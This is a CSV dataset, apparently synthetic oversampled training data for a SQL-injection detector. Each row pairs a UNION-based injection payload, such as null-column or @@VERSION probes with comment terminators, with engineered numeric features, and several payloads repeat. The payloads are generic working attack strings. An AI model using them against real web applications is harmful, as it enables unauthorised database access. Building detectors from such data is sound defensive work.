id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000011,attack,union," select * from users where id  =  '1' + $+*$ union select 1,@@VERSION -- 1'",nearest_attack_euclidean,R000007,0.4862329727350915,75.5526836341608,31.557853092671355,4.379855869127456,40.0,3.0,17.663220360992966,14.889463273167838,0.5296487757722612,0.03972365818291959,0.23339098421562313,0.19723658182919596,3.0,0.0,2.0,0.0,1.889463273167839,1.0,0.0,0.22107345366432263,0.0,0.0,0.9999999999999996,6.778926546335677,1.0,0.0,1.0,0.0,0.0,1.0,0.11053672683216131,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000012,attack,union,"-9110""   )    )    union all select 2263,2263,2263,2263,2263#",nearest_attack_euclidean,R000059,0.21811486932919996,60.666834812846446,22.0,3.7929421354992465,14.0,23.666834812846446,14.0,9.0,0.23084967288471378,0.38989729309039933,0.23084967288471375,0.14840336114017313,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,0.08329129678838842,0.0,3.9167087032116115,1.0,0.0,1.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000013,attack,union,"-8812""  )   where 1646  =  1646 union all select 1646,1646,1646,1646,1646,1646--",nearest_attack_euclidean,R000043,0.5251658362680351,80.0,24.650876014426974,3.835669630895547,19.976314021640462,34.047371956719076,15.301752028853949,10.674561992786513,0.24970392527050578,0.4255921494589885,0.19127190036067435,0.13343202490983141,0.0,1.0,3.0,0.0,0.0,1.0,0.0,1.1627190036067436,0.0,0.0,4.511842989179769,4.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000014,attack,union,"1%' union all select null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000023,0.2004604270102522,62.30372841986272,15.92406789503432,3.13650778172578,46.30372841986272,1.0,4.0,11.0,0.7431230827756119,0.016054807326524256,0.06421922930609704,0.17660288059176688,1.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.9240678950343191,0.0,7.0759321049656805,2.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000015,attack,union,"1'  )   union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000033,0.4427557940716321,57.766191839408286,15.873843440042265,3.2458625520086235,39.513878719492816,1.0,8.0,9.252313119915469,0.6830770199984906,0.01740658371443668,0.1392526697154933,0.16026372657157953,0.8738434400422654,0.0,2.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,5.378469679873204,2.0,0.8738434400422654,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000016,attack,union,"-1401""   )    )    union all select 3480,3480,3480,3480,3480,3480--",nearest_attack_euclidean,R000072,0.06611630171561914,67.1911075629624,20.058802327065354,3.786295656549827,14.073502908831692,28.11760465413071,14.0,11.0,0.20937484869594214,0.41838218284772577,0.20845606233554598,0.1637869061207861,0.0,1.0,3.0,0.0,0.0,0.014700581766338316,0.0,1.9852994182336616,0.0,0.0,5.0,3.0147005817663386,0.0,1.0,1.0,0.0,0.0,0.014700581766338205,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.014700581766338205,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0147005817663386
SMOTE_000017,attack,union," select * from users where id  =  1 union select @ $$,version  (    )   -- 1",nearest_attack_euclidean,R000011,0.8275794561967753,76.0,26.0,3.865918829004488,40.65580619517395,2.655806195173952,23.655806195173952,9.032581414478145,0.534944818357552,0.03494481835755203,0.3112606078312362,0.11884975545365978,0.0,0.0,2.0,0.0,1.0,1.0,0.0,2.0,0.0,0.0,0.9999999999999996,4.6883876096520956,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000018,attack,union," select * from users where id  =  '1'<@$$ union select 1,version  (    )   -- 1'",nearest_attack_euclidean,R000010,2.0139864737288633,77.7107735882454,29.83138112940368,4.209650725973837,40.0,3.0,20.252928305894482,14.45784528235092,0.5152615094116973,0.03864461320587731,0.25964774532365237,0.186446132058773,3.0,0.0,2.0,0.0,1.45784528235092,1.0,0.0,1.0843094352981604,0.0,0.0,0.9999999999999996,5.915690564701839,1.0,0.0,1.0,0.0,0.0,1.0,0.5421547176490802,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000019,attack,union,"-5748' union all select 1224,1224,1224,1224,1224,1224,1224,1224,1224#",nearest_attack_euclidean,R000058,0.2358674704893406,69.0,21.0,3.449414072222564,14.0,40.0,4.0,11.0,0.2028985507246377,0.5797101449275363,0.05797101449275363,0.15942028985507245,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,8.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000020,attack,union,"-8812""  )   where 1646  =  1646 union all select 1646,1646,1646,1646,1646,1646--",nearest_attack_euclidean,R000043,1.2579884422074776,75.67435569486355,23.691025406775967,3.803227981664897,23.94359349158451,27.657685982951136,14.0,10.073076220327904,0.3279686971826427,0.3530943321251899,0.18646951141513451,0.13246745927703282,0.0,1.0,2.6910254067759682,0.0,0.0,1.0,0.0,1.0,0.0,0.0,4.382050813551936,3.6910254067759682,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000021,attack,union," select * from users where id  =  '1' union select @ 1,version  (    )   --  1'",nearest_attack_euclidean,R000005,0.7899635868594784,79.33930229966134,26.6786045993227,3.913849402129709,40.0,3.0,24.3213954006773,12.017906898984052,0.5041816310148016,0.03781362232611013,0.3066309618927172,0.15137378476637106,3.0,0.0,2.0,0.0,1.0,1.0,0.0,2.0,0.0,0.0,0.9999999999999996,4.33930229966135,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000022,attack,union,"-8308""  )   union all select 3084,3084,3084,3084,3084,3084,3084,3084,3084#",nearest_attack_euclidean,R000069,1.5813683109965484,76.34747206030292,20.0,3.4954767413443304,14.0,41.564981373535275,8.0,12.782490686767638,0.18363773499252692,0.5442415100049821,0.10493584856715824,0.16718490643533282,0.0,1.0,1.7824906867676378,0.0,0.0,0.0,0.0,1.0,0.0,0.0,8.391245343383819,1.782490686767638,0.0,1.0,0.3912453433838189,0.6087546566161811,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000023,attack,union,"-3370""  )   union all select 7845,7845,7845,7845,7845,7845#",nearest_attack_euclidean,R000019,1.1976159078087973,64.93452768668833,21.20872964177489,3.844460498159408,14.0,32.747622149350654,8.0,10.186905537337664,0.21825850031753632,0.5006740567073787,0.12471914303859219,0.15634829993649274,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,6.186905537337664,1.0,0.0,1.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000024,attack,union,"-4711%""   )    )    union all select 6737,6737,6737,6737#",nearest_attack_euclidean,R000077,0.8353119615469693,61.323672688851794,22.0,3.8099891429411485,14.0,23.458938151081433,14.0,9.864734537770358,0.2318224156655445,0.3760961542115757,0.2318224156655445,0.1602590144573352,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,0.0,3.864734537770358,1.0,0.0,1.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000025,attack,union,"1'  )   where 8268  =  8268 union all select null,null,null,null--",nearest_attack_euclidean,R000066,0.27851304752190104,65.5193224511977,23.137336442514943,3.8497519368407813,33.90130845988044,9.755350433832197,14.0,7.862663557485055,0.5160015594658935,0.15027715114847093,0.21384937999055786,0.11987190939507758,1.0,0.0,1.9313317787425275,0.0,0.0,1.0,0.0,1.0,0.0,0.0,2.862663557485055,2.9313317787425275,1.0,0.0,0.9313317787425275,0.06866822125747257,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000026,attack,union," select * from users where id  =  '1' union select @ 1,version  (    )   --  1'",nearest_attack_euclidean,R000005,2.157025433232673,77.56699713782963,26.0,3.879625438721324,40.0,2.522332379276545,24.04466475855309,11.0,0.5158761016800157,0.03240560735332412,0.3098523630046558,0.14186592796200434,1.5669971378296346,0.0,2.0,0.0,1.0,1.0,0.0,2.0,0.0,0.0,0.9999999999999996,4.95533524144691,0.5223323792765449,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000027,attack,union,"1' where 2774  =  2774 union all select null,null,null,null,null#",nearest_attack_euclidean,R000060,1.640554329137276,65.36188483669878,22.361884836698778,3.815577900259089,37.55246065320489,9.0,11.447539346795107,7.361884836698777,0.5747777235028124,0.13770233950342914,0.17493501379363502,0.11258492320012332,1.0,0.0,0.7237696733975537,0.0,0.0,1.0,0.0,0.3618848366987769,0.0,0.0,3.638115163301223,1.7237696733975536,1.0,0.0,0.36188483669877675,0.6381151633012232,0.0,1.0,0.3618848366987768,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000028,attack,union,"1' where 2774  =  2774 union all select null,null,null,null,null#",nearest_attack_euclidean,R000060,1.9452089782818034,71.62875849760471,22.0,3.7291042545049407,42.787861998631264,9.0,11.89393099931563,7.946965499657816,0.597602618988208,0.12684346125054677,0.16491098928519357,0.11064293047605162,0.5265172501710922,0.0,0.0,0.0,0.0,1.0,0.0,0.4734827498289078,0.0,0.0,4.946965499657816,1.0,0.5265172501710922,0.0,0.0,1.0,0.0,1.0,0.47348274982890776,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000029,attack,union,"1' where 2774  =  2774 union all select null,null,null,null,null#",nearest_attack_euclidean,R000060,1.999202872878985,71.81275543141795,22.0,3.7271501888890297,42.8930031036674,9.0,11.946501551833702,7.973250775916851,0.5975360739850206,0.1265209739274077,0.16521812006913555,0.11072483201843615,0.5133746120415748,0.0,0.0,0.0,0.0,1.0,0.0,0.48662538795842525,0.0,0.0,4.973250775916851,1.0,0.5133746120415748,0.0,0.0,1.0,0.0,1.0,0.4866253879584252,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000030,attack,union,"1""   )    )     )   union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R000071,0.872345540007631,69.59796552685484,16.24300246236751,3.199775512955921,40.055980301059904,1.0,17.027990150529952,11.513995075264978,0.5755681471672789,0.014488515085475995,0.2443185283272114,0.16562480942003371,0.0,1.0,2.0,0.0,0.0,0.0,0.0,2.7569975376324884,0.24300246236751155,0.0,5.513995075264977,2.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000031,attack,union,"1'  )   union all select null,null,null,null,null,null#",nearest_attack_euclidean,R000018,0.5695500392167605,58.675206330134046,16.424062268861622,3.2654659510752606,40.96843588203134,1.0,8.42406226886162,8.28270817924108,0.6962078861877958,0.017356856042618635,0.14409018499356158,0.142345072776024,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,5.28270817924108,0.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000032,attack,union,"-3879' union all select 9814,9814,9814,9814,9814,9814,9814,9814,9814--",nearest_attack_euclidean,R000031,0.9450992358381614,68.3711529426466,20.32576941147068,3.7633271325028947,14.0,37.39384470823457,5.303077645882715,11.674230588529321,0.20501183709954893,0.5456534092023199,0.07862215899806674,0.17071259470006445,1.0,0.0,3.0,0.0,0.0,0.0,0.0,0.32576941147067906,0.0,0.0,7.348461177058642,3.0,1.0,0.0,1.0,0.0,0.0,0.0,0.32576941147067895,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
